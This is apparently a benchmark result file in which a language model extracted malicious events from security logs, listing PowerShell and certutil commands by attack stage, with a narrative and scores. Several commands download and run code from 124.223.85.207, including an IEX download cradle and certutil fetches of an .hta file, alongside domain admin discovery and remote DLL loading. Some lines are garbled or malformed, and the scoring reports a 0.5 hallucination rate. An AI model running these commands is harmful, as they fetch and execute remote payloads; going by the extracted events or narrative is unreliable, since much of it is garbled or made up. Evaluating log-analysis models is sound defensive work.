@@ -1,0 +1,114 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0526\u2026\ufffd\ufffd\ufffd\ufffd\u01b7\u2026\u0411\u0411\u05e4\u2026\u0412\u2026\u0432\u2026\u0437\u2026\u044f\u2026\u043d\u2026\u0430\u2026\u0443\u2026\u043e\u2026\u0435\u2026\u0455\u2026\u0459\u2026\u0257\u2026\u0432\u2026\u043c\u2026\u043f\u2026\u043b\u2026\u0440\u2026\u0418\u2026\u0438\u2026\u0427\u2026\u0431\u2026\u0447\u2026\u0446\u2026\u0448\u2026",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\ \"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\ \"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\ \"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \\\"domain admins\\\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \\\"domain admins\\\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \\\"domain admins\\\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test(hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"[System.Net.HttpWebRequest]::get_current().headers.add(\\\"Accept\\\", \\\"text/html\\\"); if ([IO.File]::exists(\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Temporary ASP.NET Files\\root\\f8a5b2d6\\76e7ae2f\\assembly\\dl3\\b1b4e2a2_a4a2e901\\00000400_00000000\\system_web\\.tmp\")) { rm-item -force C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Temporary ASP.NET Files\\root\\f8a5b2d6\\76e7ae2f\\assembly\\dl3\\b1b4e2a2_a4a2e901\\00000400_00000000\\system_web\\.tmp | out-file C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Temporary ASP.NET Files\\root\\f8a5b2d6\\76e7ae2f\\assembly\\dl3\\b1b4e2a2_a4a2e901\\00000400_00000000\\system_web\\.tmp\" } \\\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"[System.Net.HttpWebRequest]::get_current().headers.add(\\\"Accept\\\", \\\"text/html\\\"); if ([IO.File]::exists(\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Temporary ASP.NET Files\\root\\f8a5b2d6\\76e7ae2f\\assembly\\dl3\\b1b4e2a2_a4a2e901\\00000400_00000000\\system_web\\.tmp\")) { rm-item -force C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Temporary ASP.NET Files\\root\\f8a5b2d6\\76e7ae2f\\assembly\\dl3\\b1b4e2a2_a4a2e901\\00000400_00000000\\system_web\\.tmp | out-file C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Temporary ASP.NET Files\\root\\f8a5b2d6\\76e7ae2f\\assembly\\dl3\\b1b4e2a2_a4a2e901\\00000400_00000000\\system_web\\.tmp\" } \\\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1047.002 -TestNumbers 1 -Cleanup\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Reflection.Assembly]::LoadFrom('\\\\?\\UNC\\path\\to\\asbestos.dll'); [Asbestos.assembly_load]( '\\\\unc\\path\\to\\asbestos.dll')",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C `[Reflection.Assembly]::LoadFrom('\\\\?\\UNC\\path\\to\\asbestos.dll'); [Asbestos.assembly_load]( '\\\\unc\\path\\to\\asbestos.dll')`",
+        "stage": "Privilege Escalation"
+      }
+    ],
+    "narrative": "This analysis reveals an advanced threat actor has gained access to the victim's machine through phishing, using PowerShell scripts to download malware from remote servers. The actors have employed various tactics such as certificate manipulation, privilege escalation, persistence via web shell, lateral movement through discovery, and exploitation of vulnerabilities.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 237360,
+      "completion_tokens": 3019,
+      "total_tokens": 240379,
+      "wall_clock_s": 31.124,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.25,
+      "f1": 0.25,
+      "tp": 4,
+      "fp": 12,
+      "fn": 12
+    },
+    "stage": {
+      "precision": 0.1875,
+      "recall": 0.1875,
+      "f1": 0.1875,
+      "tp": 3,
+      "fp": 13,
+      "fn": 13,
+      "recall_partial": 0.10714285714285714
+    },
+    "hallucination_rate": 0.5,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 237360,
+      "completion_tokens": 3019,
+      "total_tokens": 240379,
+      "wall_clock_s": 31.124,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
